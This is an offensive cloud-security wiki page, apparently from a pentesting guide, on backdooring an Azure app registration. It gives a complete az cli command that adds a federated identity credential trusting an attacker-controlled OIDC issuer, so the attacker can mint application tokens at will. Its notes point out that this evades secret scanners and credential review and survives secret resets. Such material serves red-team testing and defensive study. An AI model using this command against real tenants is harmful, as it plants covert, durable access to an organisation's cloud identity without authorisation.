---
title: "Federated credentials: minting tokens from an attacker OIDC issuer"
order: 5
description: "Adding a federated identity credential to an app registration to mint tokens from an attacker-controlled OIDC issuer without a secret."
keywords:
  - federated credentials
  - workload identity federation
  - OIDC
  - federated identity
  - app registration
---

# Federated credentials

An app registration can trust an external **OIDC issuer** through a federated identity credential, so a token from that issuer is exchanged for an app token with no stored secret. Add a federated credential pointing at an issuer you control, and you mint tokens as the application at will, a quiet, secretless backdoor.

## Add a federated credential

```bash
# add a federated identity credential bound to an attacker-controlled issuer/subject
az ad app federated-credential create --id <appId> --parameters '{
  "name":"backdoor",
  "issuer":"https://you.example/oidc",
  "subject":"repo:attacker/x:ref:refs/heads/main",
  "audiences":["api://AzureADTokenExchange"]
}'
# then present a matching OIDC token and exchange it for an app token
```

## Exploitation notes

- No client secret or certificate is stored on the app, so this evades credential-focused review and secret scanners.
- The issuer and subject you set are the only trust check; both are attacker-chosen when you can write the credential.
- Like an added secret, it is durable persistence as the application identity and survives user and secret resets.

## Tools

- **az cli** (`az ad app federated-credential`).
- **BARK**: federated-credential attack paths.

## References

- [SpecterOps: federated credential abuse (BARK)](https://github.com/BloodHoundAD/BARK)
- [HackTricks Cloud: Azure applications](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: workload identity federation](https://learn.microsoft.com/entra/workload-id/workload-identity-federation)
